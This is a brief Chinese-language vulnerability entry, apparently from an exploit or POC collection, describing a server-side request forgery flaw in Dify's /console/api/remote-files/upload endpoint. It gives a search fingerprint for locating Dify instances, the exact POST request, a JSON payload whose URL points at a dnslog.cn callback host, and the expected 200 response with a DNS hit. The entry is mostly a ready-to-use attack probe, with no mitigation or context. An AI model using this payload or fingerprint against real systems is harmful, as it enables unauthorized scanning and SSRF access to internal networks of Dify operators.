# difyupload存在SSRF漏洞

Dify ｜ SSRF ｜ —
- **指纹**：`app="Dify"`
- **请求**：`POST /console/api/remote-files/upload HTTP/1.1`

**Payload**
```
{"url":"http://aaaa.dnslog.cn"}
```
- **响应特征**：200 dnslog回显